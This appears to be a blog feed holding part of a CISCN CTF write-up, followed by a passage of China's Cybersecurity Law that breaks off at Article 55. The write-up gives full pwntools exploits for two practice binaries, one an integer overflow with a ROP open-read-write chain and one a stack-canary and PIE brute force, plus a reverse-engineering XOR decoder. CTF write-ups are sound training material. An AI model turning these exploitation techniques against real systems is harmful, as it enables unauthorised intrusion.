title="基于国密SM2算法的密钥密文分发:"></a>基于国密SM2算法的密钥密文分发:</h4><p>非预期解，在登录获取id并且发送完公钥后，通过quantum获取服务器端密钥的密文后，search查看发现服务器端存在密钥的明文，即quantumStringServer，发送该明文进行check获取flag。</p><p>​                                <a href="https://imgse.com/i/p9LeEZj"><img src="https://s1.ax1x.com/2023/05/27/p9LeEZj.png" alt="p9LeEZj.png" style="zoom: 50%;" />        </a>    </p><blockquote><p>flag{fe362b36-56e5-4b6c-a5cc-12d3e755ce0}</p></blockquote><h4 id="可信度量"><a href="#可信度量" class="headerlink" title="可信度量:"></a>可信度量:</h4><p>非预期解，通过命令全局搜索flag字符串。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">grep <span class="token operator">-</span>ra <span class="token string">"flag&#123;"</span> <span class="token operator">/</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![img](file:///C:\Users\86198\Documents\Tencent Files\1766871892\Image\C2C\OYUNA5G0`(OO)VX%3$@P947.png)</p><h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><h4 id="烧烤摊儿"><a href="#烧烤摊儿" class="headerlink" title="烧烤摊儿:"></a>烧烤摊儿:</h4><p>首先，分析vip函数，发现无符号整数存在整数溢出，因此考虑输入-1000000使余额溢出到大于100000。</p><p>![img](file:///C:\Users\86198\Documents\Tencent Files\1766871892\Image\C2C]I{EODH[FQ1S]6X$Y}L0N8Y.png)</p><p>之后买下该店后通过栈溢出劫持程序执行流，因为本题禁止了execve的系统调用，因此考虑orw读取flag。只需要控制栈溢出后分别执行open，read，write三个函数。</p><p>完整exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#io = process("./shaokao")</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>name_addr <span class="token operator">=</span> <span class="token number">0x4E60F0</span>open_addr <span class="token operator">=</span> <span class="token number">0x457C90</span>read_addr <span class="token operator">=</span> <span class="token number">0x457DC0</span>write_addr <span class="token operator">=</span> <span class="token number">0x457E60</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x40264f</span>pop_rsi_ret <span class="token operator">=</span> <span class="token number">0x40a67e</span>pop_rdx_rbx <span class="token operator">=</span> <span class="token number">0x4a404b</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token comment">#integer overflow</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'-1000000'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'5'</span><span class="token punctuation">)</span><span class="token comment">#rop orw</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>name_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>open_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>name_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_rbx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>name_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_rbx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'./flag\x00\x00'</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x16</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="funcanary："><a href="#funcanary：" class="headerlink" title="funcanary：()"></a>funcanary：()</h4><p>简单栈溢出，只不过在栈上放了canary，分析发现存在后门函数backdoor，同时main函数是while(1)循环，这就使得我们输入canary失败时仍然能回到main函数，因此可以通过爆破泄露出canary的内容(8位canary，爆破七次)。程序开启了pie，因此需要爆破后门函数的地址,发现后三位不变，爆破倒数第四位。</p><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./funcanary'</span><span class="token punctuation">)</span><span class="token comment"># io = remote('', '')</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn123'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'welcome\n'</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> <span class="token string">b'\x00'</span><span class="token keyword">for</span> m <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x68</span> <span class="token operator">+</span> canary <span class="token operator">+</span> p8<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        msg <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'welcome\n'</span><span class="token punctuation">)</span>        <span class="token comment">#输入了正确的canary，返回</span>        <span class="token keyword">if</span> <span class="token string">b'have fun'</span> <span class="token keyword">in</span> msg<span class="token punctuation">:</span>            canary <span class="token operator">+=</span> p8<span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token keyword">break</span>backdoor <span class="token operator">=</span> <span class="token number">0x1229</span><span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    addr <span class="token operator">=</span> k <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> <span class="token number">2</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x68</span> <span class="token operator">+</span> canary <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token string">b'\x31'</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    msg <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'flag&#123;'</span> <span class="token keyword">in</span> msg<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span>        io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="re"><a href="#re" class="headerlink" title="re"></a>re</h3><h4 id="babyRE："><a href="#babyRE：" class="headerlink" title="babyRE："></a>babyRE：</h4><p>下载文件之后发现是Snap的程序，找到他的官网<a href="https://snap.berkeley.edu/snap/snap.html#%E5%9C%A8%E7%BA%BF%E5%AF%BC%E5%85%A5%E6%96%87%E4%BB%B6%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%9C%89%E4%BA%9B%E5%8F%98%E9%87%8F%E5%92%8C%E5%87%BD%E6%95%B0%E5%91%BD%E5%90%8D%E4%B8%8D%E8%A7%84%E8%8C%83%EF%BC%8C%E5%B0%86%E5%85%B6%E8%A7%84%E8%8C%83%E5%8C%96%EF%BC%8C%E5%8F%91%E7%8E%B0">https://snap.berkeley.edu/snap/snap.html#在线导入文件，发现有些变量和函数命名不规范，将其规范化，发现</a></p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230528135150.png" style="zoom:67%;" /><p>此为初始化函数，相当于初始化数组，后发现</p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230528135240.png" style="zoom: 67%;" /><p>将输入的字符第一个与前一个进行^ 操作，第二个与第一个进行^ 以此类推.</p><p>编写脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">list</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">74</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">85</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">75</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">92</span><span class="token punctuation">,</span><span class="token number">92</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">81</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">76</span><span class="token punctuation">,</span><span class="token number">88</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">86</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">82</span><span class="token punctuation">,</span><span class="token number">84</span><span class="token punctuation">,</span><span class="token number">85</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">85</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">]</span>str1 <span class="token operator">=</span> <span class="token string">'f'</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>str1<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> j<span class="token punctuation">:</span>            str1 <span class="token operator">=</span> str1 <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到flag</p><blockquote><p> flag{12307bbf-9e91-4e61-a900-dd26a6d0ea4c}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CISCN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全法</title>
      <link href="/2023/04/12/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95/"/>
      <url>/2023/04/12/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h4 id="目-录"><a href="#目-录" class="headerlink" title="目 录"></a>目 录</h4><p>[TOC]</p><h4 id="第一章-总-则"><a href="#第一章-总-则" class="headerlink" title="第一章 总 则"></a>第一章 总 则</h4><p><strong>第一条</strong> 为了保障网络安全，维护网络空间主权和国家安全、社会公共利益，保护公民、法人和其他组织的合法权益，促进经济社会信息化健康发展，制定本法。 </p><p><strong>第二条</strong> 在中华人民共和国境内建设、运营、维护和使用网络，以及网络安全的监督管理，适用本法。 </p><p><strong>第三条</strong> 国家坚持网络安全与信息化发展并重，遵循积极利用、科学发展、 依法管理、确保安全的方针，推进网络基础设施建设和互联互通，鼓励网络技术创新和应用，支持培养网络安全人才，建立健全网络安全保障体系，提高网络安全保护能力。 </p><p><strong>第四条</strong> 国家制定并不断完善网络安全战略，明确保障网络安全的基本要 求和主要目标，提出重点领域的网络安全政策、工作任务和措施。 </p><p><strong>第五条</strong> 国家采取措施，监测、防御、处置来源于中华人民共和国境内外的网络安全风险和威胁，保护关键信息基础设施免受攻击、侵入、干扰和破坏，依法惩治网络违法犯罪活动，维护网络空间安全和秩序。 </p><p><strong>第六条</strong> 国家倡导诚实守信、健康文明的网络行为，推动传播社会主义核心价值观，采取措施提高全社会的网络安全意识和水平，形成全社会共同参与促进网络安全的良好环境。 </p><p><strong>第七条</strong> 国家积极开展网络空间治理、网络技术研发和标准制定、打击网 络违法犯罪等方面的国际交流与合作，推动构建和平、安全、开放、合作的网络空间，建立多边、民主、透明的网络治理体系。 </p><p><strong>第八条</strong> 国家网信部门负责统筹协调网络安全工作和相关监督管理工作。国务院电信主管部门、公安部门和其他有关机关依照本法和有关法律、行政法规的规定，在各自职责范围内负责网络安全保护和监督管理工作。县级以上地方人民政府有关部门的网络安全保护和监督管理职责，按照国家有关规定确定。 </p><p><strong>第九条</strong> 网络运营者开展经营和服务活动，必须遵守法律、行政法规，尊重社会公德，遵守商业道德，诚实信用，履行网络安全保护义务，接受政府和社会的监督，承担社会责任。 </p><p><strong>第十条</strong> 建设、运营网络或者通过网络提供服务，应当依照法律、行政法规的规定和国家标准的强制性要求，采取技术措施和其他必要措施，保障网络安全、稳定运行，有效应对网络安全事件，防范网络违法犯罪活动，维护网络数据的完整性、保密性和可用性。</p><p><strong>第十一条</strong> 网络相关行业组织按照章程，加强行业自律，制定网络安全行 为规范，指导会员加强网络安全保护，提高网络安全保护水平，促进行业健康发展。 </p><p><strong>第十二条</strong> 国家保护公民、法人和其他组织依法使用网络的权利，促进网络接入普及，提升网络服务水平，为社会提供安全、便利的网络服务，保障网络信息依法有序自由流动。任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得危害网络安全，不得利用网络从事危害国家安全、荣誉和利益，煽动颠覆国家政权、推翻社会主义制度，煽动分裂国家、破坏国家统一，宣扬恐怖主义、极端主义，宣扬民族仇恨、民族歧视，传播暴力、淫秽色情信息，编造、传播虚假信息扰乱经济秩序和社会秩序，以及侵害他人名誉、隐私、知识产权和其他合法权益等活动。 </p><p><strong>第十三条</strong> 国家支持研究开发有利于未成年人健康成长的网络产品和服务，依法惩治利用网络从事危害未成年人身心健康的活动，为未成年人提供安全、健康的网络环境。 </p><p><strong>第十四条</strong> 任何个人和组织有权对危害网络安全的行为向网信、电信、公 安等部门举报。收到举报的部门应当及时依法作出处理；不属于本部门职责的，应当及时移送有权处理的部门。 有关部门应当对举报人的相关信息予以保密，保护举报人的合法权益。 </p><h4 id="第二章-网络安全支持与促进"><a href="#第二章-网络安全支持与促进" class="headerlink" title="第二章 网络安全支持与促进"></a>第二章 网络安全支持与促进</h4><p><strong>第十五条</strong> 国家建立和完善网络安全标准体系。国务院标准化行政主管部门和国务院其他有关部门根据各自的职责，组织制定并适时修订有关网络安全管理以及网络产品、服务和运行安全的国家标准、行业标准。国家支持企业、研究机构、高等学校、网络相关行业组织参与网络安全国家 标准、行业标准的制定。 </p><p><strong>第十六条</strong> 国务院和省、自治区、直辖市人民政府应当统筹规划，加大投 入，扶持重点网络安全技术产业和项目，支持网络安全技术的研究开发和应用，推广安全可信的网络产品和服务，保护网络技术知识产权，支持企业、研究机构 和高等学校等参与国家网络安全技术创新项目。 </p><p><strong>第十七条</strong> 国家推进网络安全社会化服务体系建设，鼓励有关企业、机构开展网络安全认证、检测和风险评估等安全服务。 </p><p><strong>第十八条</strong> 国家鼓励开发网络数据安全保护和利用技术，促进公共数据资源开放，推动技术创新和经济社会发展。 国家支持创新网络安全管理方式，运用网络新技术，提升网络安全保护水平。 </p><p><strong>第十九条</strong> 各级人民政府及其有关部门应当组织开展经常性的网络安全宣 传教育，并指导、督促有关单位做好网络安全宣传教育工作。大众传播媒介应当有针对性地面向社会进行网络安全宣传教育。 </p><p><strong>第二十条</strong> 国家支持企业和高等学校、职业学校等教育培训机构开展网络 安全相关教育与培训，采取多种方式培养网络安全人才，促进网络安全人才交流。 </p><h4 id="第三章-网络运行安全"><a href="#第三章-网络运行安全" class="headerlink" title="第三章 网络运行安全"></a>第三章 网络运行安全</h4><p>第一节 一般规定 </p><p><strong>第二十一条</strong> 国家实行网络安全等级保护制度。网络运营者应当按照网络安全等级保护制度的要求，履行下列安全保护义务，保障网络免受干扰、破坏或者未经授权的访问，防止网络数据泄露或者被窃取、篡改：</p><p>（一）制定内部安全管理制度和操作规程，确定网络安全负责人，落实网络安全保护责任； </p><p>（二）采取防范计算机病毒和网络攻击、网络侵入等危害网络安全行为的技术措施； </p><p>（三）采取监测、记录网络运行状态、网络安全事件的技术措施，并按照规定留存相关的网络日志不少于六个月； </p><p>（四）采取数据分类、重要数据备份和加密等措施； </p><p>（五）法律、行政法规规定的其他义务。 </p><p><strong>第二十二条</strong> 网络产品、服务应当符合相关国家标准的强制性要求。网络 产品、服务的提供者不得设置恶意程序；发现其网络产品、服务存在安全缺陷、漏洞等风险时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。网络产品、服务的提供者应当为其产品、服务持续提供安全维护；在规定或 者当事人约定的期限内，不得终止提供安全维护。网络产品、服务具有收集用户信息功能的，其提供者应当向用户明示并取得 同意；涉及用户个人信息的，还应当遵守本法和有关法律、行政法规关于个人信息保护的规定。 </p><p><strong>第二十三条</strong> 网络关键设备和网络安全专用产品应当按照相关国家标准的强制性要求，由具备资格的机构安全认证合格或者安全检测符合要求后，方可销 售或者提供。国家网信部门会同国务院有关部门制定、公布网络关键设备和网络安全专用产品目录，并推动安全认证和安全检测结果互认，避免重复认证、检测。 </p><p><strong>第二十四条</strong> 网络运营者为用户办理网络接入、域名注册服务，办理固定电话、移动电话等入网手续，或者为用户提供信息发布、即时通讯等服务，在与用户签订协议或者确认提供服务时，应当要求用户提供真实身份信息。用户不提 供真实身份信息的，网络运营者不得为其提供相关服务。国家实施网络可信身份战略，支持研究开发安全、方便的电子身份认证技术，推动不同电子身份认证之间的互认。 </p><p><strong>第二十五条</strong> 网络运营者应当制定网络安全事件应急预案，及时处置系统漏洞、计算机病毒、网络攻击、网络侵入等安全风险；在发生危害网络安全的事件时，立即启动应急预案，采取相应的补救措施，并按照规定向有关主管部门报告。 </p><p><strong>第二十六条</strong> 开展网络安全认证、检测、风险评估等活动，向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息，应当遵守国家有关规定。 </p><p><strong>第二十七条</strong> 任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网 络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具；明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付结算等帮助。 </p><p><strong>第二十八条</strong> 网络运营者应当为公安机关、国家安全机关依法维护国家安全和侦查犯罪的活动提供技术支持和协助</p><p><strong>第二十九条</strong> 国家支持网络运营者之间在网络安全信息收集、分析、通报和应急处置等方面进行合作，提高网络运营者的安全保障能力。有关行业组织建立健全本行业的网络安全保护规范和协作机制，加强对网络安全风险的分析评估，定期向会员进行风险警示，支持、协助会员应对网络安全风险。 </p><p><strong>第三十条</strong> 网信部门和有关部门在履行网络安全保护职责中获取的信息，只能用于维护网络安全的需要，不得用于其他用途。 第二节 关键信息基础设施的运行安全 </p><p><strong>第三十一条</strong> 国家对公共通信和信息服务、能源、交通、水利、金融、公 共服务、电子政务等重要行业和领域，以及其他一旦遭到破坏、丧失功能或者数据泄露，可能严重危害国家安全、国计民生、公共利益的关键信息基础设施，在网络安全等级保护制度的基础上，实行重点保护。关键信息基础设施的具体范围和安全保护办法由国务院制定。 国家鼓励关键信息基础设施以外的网络运营者自愿参与关键信息基础设施 保护体系。 </p><p><strong>第三十二条</strong> 按照国务院规定的职责分工，负责关键信息基础设施安全保护工作的部门分别编制并组织实施本行业、本领域的关键信息基础设施安全规划，指导和监督关键信息基础设施运行安全保护工作。 </p><p><strong>第三十三条</strong> 建设关键信息基础设施应当确保其具有支持业务稳定、持续运行的性能，并保证安全技术措施同步规划、同步建设、同步使用。 </p><p><strong>第三十四条</strong> 除本法第二十一条的规定外，关键信息基础设施的运营者还应当履行下列安全保护义务： </p><p>（一）设置专门安全管理机构和安全管理负责人，并对该负责人和关键岗位的人员进行安全背景审查； </p><p>（二）定期对从业人员进行网络安全教育、技术培训和技能考核； </p><p>（三）对重要系统和数据库进行容灾备份； </p><p>（四）制定网络安全事件应急预案，并定期进行演练； </p><p>（五）法律、行政法规规定的其他义务。 </p><p><strong>第三十五条</strong> 关键信息基础设施的运营者采购网络产品和服务，可能影响国家安全的，应当通过国家网信部门会同国务院有关部门组织的国家安全审查。 </p><p><strong>第三十六条</strong> 关键信息基础设施的运营者采购网络产品和服务，应当按照规定与提供者签订安全保密协议，明确安全和保密义务与责任。 </p><p><strong>第三十七条</strong> 关键信息基础设施的运营者在中华人民共和国境内运营中收集和产生的个人信息和重要数据应当在境内存储。因业务需要，确需向境外提供的，应当按照国家网信部门会同国务院有关部门制定的办法进行安全评估；法律、行政法规另有规定的，依照其规定。 </p><p><strong>第三十八条</strong> 关键信息基础设施的运营者应当自行或者委托网络安全服务机构对其网络的安全性和可能存在的风险每年至少进行一次检测评估，并将检测 评估情况和改进措施报送相关负责关键信息基础设施安全保护工作的部门。 </p><p><strong>第三十九条</strong> 国家网信部门应当统筹协调有关部门对关键信息基础设施的安全保护采取下列措施： </p><p>一 对关键信息基础设施的安全风险进行抽查检测，提出改进措施，必要时可以委托网络安全服务机构对网络存在的安全风险进行检测评估；</p><p>二 定期组织关键信息基础设施的运营者进行网络安全应急演练，提高应对网络安全事件的水平和协同配合能力</p><p>三 促进有关部门、关键信息基础设施的运营者以及有关研究机构、网络安全服务机构等之间的网络安全信息共享</p><p>四 对网络安全事件的应急处置与网络功能的恢复等，提供技术支持和协助。 </p><h4 id="第四章-网络信息安全"><a href="#第四章-网络信息安全" class="headerlink" title="第四章 网络信息安全"></a>第四章 网络信息安全</h4><p><strong>第四十条</strong> 网络运营者应当对其收集的用户信息严格保密，并建立健全用户信息保护制度。 </p><p><strong>第四十一条</strong> 网络运营者收集、使用个人信息，应当遵循合法、正当、必要的原则，公开收集、使用规则，明示收集、使用信息的目的、方式和范围，并经被收集者同意。网络运营者不得收集与其提供的服务无关的个人信息，不得违反法律、行政法规的规定和双方的约定收集、使用个人信息，并应当依照法律、行政法规的规定和与用户的约定，处理其保存的个人信息。 </p><p><strong>第四十二条</strong> 网络运营者不得泄露、篡改、毁损其收集的个人信息；未经被收集者同意，不得向他人提供个人信息。但是，经过处理无法识别特定个人且不能复原的除外。网络运营者应当采取技术措施和其他必要措施，确保其收集的个人信息安全，防止信息泄露、毁损、丢失。在发生或者可能发生个人信息泄露、毁损、丢失的 情况时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。 </p><p><strong>第四十三条</strong> 个人发现网络运营者违反法律、行政法规的规定或者双方的约定收集、使用其个人信息的，有权要求网络运营者删除其个人信息；发现网络运营者收集、存储的其个人信息有错误的，有权要求网络运营者予以更正。网络运营者应当采取措施予以删除或者更正。 </p><p><strong>第四十四条</strong> 任何个人和组织不得窃取或者以其他非法方式获取个人信息，不得非法出售或者非法向他人提供个人信息。 </p><p><strong>第四十五条</strong> 依法负有网络安全监督管理职责的部门及其工作人员，必须对在履行职责中知悉的个人信息、隐私和商业秘密严格保密，不得泄露、出售或者非法向他人提供。 </p><p><strong>第四十六条</strong> 任何个人和组织应当对其使用网络的行为负责，不得设立用于实施诈骗，传授犯罪方法，制作或者销售违禁物品、管制物品等违法犯罪活动的网站、通讯群组，不得利用网络发布涉及实施诈骗，制作或者销售违禁物品、管制物品以及其他违法犯罪活动的信息。 </p><p><strong>第四十七条</strong> 网络运营者应当加强对其用户发布的信息的管理，发现法律、行政法规禁止发布或者传输的信息的，应当立即停止传输该信息，采取消除等处置措施，防止信息扩散，保存有关记录，并向有关主管部门报告。 </p><p><strong>第四十八条</strong> 任何个人和组织发送的电子信息、提供的应用软件，不得设置恶意程序，不得含有法律、行政法规禁止发布或者传输的信息。电子信息发送服务提供者和应用软件下载服务提供者，应当履行安全管理义务，知道其用户有前款规定行为的，应当停止提供服务，采取消除等处置措施，保存有关记录，并向有关主管部门报告。 </p><p><strong>第四十九条</strong> 网络运营者应当建立网络信息安全投诉、举报制度，公布投诉、举报方式等信息，及时受理并处理有关网络信息安全的投诉和举报。 网络运营者对网信部门和有关部门依法实施的监督检查，应当予以配合。</p><p><strong>第五十条</strong> 国家网信部门和有关部门依法履行网络信息安全监督管理职责， 发现法律、行政法规禁止发布或者传输的信息的，应当要求网络运营者停止传输，采取消除等处置措施，保存有关记录；对来源于中华人民共和国境外的上述信息， 应当通知有关机构采取技术措施和其他必要措施阻断传播。 </p><h4 id="第五章-监测预警与应急处置"><a href="#第五章-监测预警与应急处置" class="headerlink" title="第五章 监测预警与应急处置"></a>第五章 监测预警与应急处置</h4><p><strong>第五十一条</strong> 国家建立网络安全监测预警和信息通报制度。国家网信部门应当统筹协调有关部门加强网络安全信息收集、分析和通报工作，按照规定统一发布网络安全监测预警信息。 </p><p><strong>第五十二条</strong> 负责关键信息基础设施安全保护工作的部门，应当建立健全本行业、本领域的网络安全监测预警和信息通报制度，并按照规定报送网络安全监测预警信息。 </p><p><strong>第五十三条</strong> 国家网信部门协调有关部门建立健全网络安全风险评估和应急工作机制，制定网络安全事件应急预案，并定期组织演练。负责关键信息基础设施安全保护工作的部门应当制定本行业、本领域的网络安全事件应急预案，并定期组织演练。网络安全事件应急预案应当按照事件发生后的危害程度、影响范围等因素对网络安全事件进行分级，并规定相应的应急处置措施。 </p><p><strong>第五十四条</strong> 网络安全事件发生的风险增大时，省级以上人民政府有关部门应当按照规定的权限和程序，并根据网络安全风险的特点和可能造成的危害， 采取下列措施： </p><p>（一）要求有关部门、机构和人员及时收集、报告有关信息，加强对网络安全风险的监测； </p><p>（二）组织有关部门、机构和专业人员，对网络安全风险信息进行分析评估，预测事件发生的可能性、影响范围和危害程度； </p><p>（三）向社会发布网络安全风险预警，发布避免、减轻危害的措施。 </p><p><strong>第五十五条</strong> 